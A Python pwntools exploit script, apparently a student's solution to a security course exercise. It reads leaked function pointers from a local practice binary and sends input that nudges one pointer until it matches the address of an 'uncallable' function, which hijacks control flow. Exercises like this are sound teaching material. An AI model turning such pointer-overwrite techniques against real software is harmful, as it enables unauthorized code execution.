#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise6/exercise6a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def read_ptrs(r):
    goodbye_line = r.recvline()
    goodbye_raw = goodbye_line[11:-1]
    goodbye = int.from_bytes(goodbye_raw, byteorder='little')

    uncallable_line = r.recvline()
    uncallable_raw = uncallable_line[11:-1]
    uncallable = int.from_bytes(uncallable_raw, byteorder='little')

    r.recvuntil(b'enter:') # dump the rest of the output
    r.recvline()
    return goodbye, uncallable

r = start()

start_goodbye, uncallable = read_ptrs(r)
goodbye = start_goodbye
i = 0

while goodbye == start_goodbye:
    r.sendline(b'A')
    i = i + 1
    goodbye, _ = read_ptrs(r)

while goodbye != uncallable:
    if goodbye < uncallable:
        r.sendline(b'd')
    else:
        r.sendline(b'a')

    goodbye, _ = read_ptrs(r)

r.sendline(b'q')
print(r.recvall())
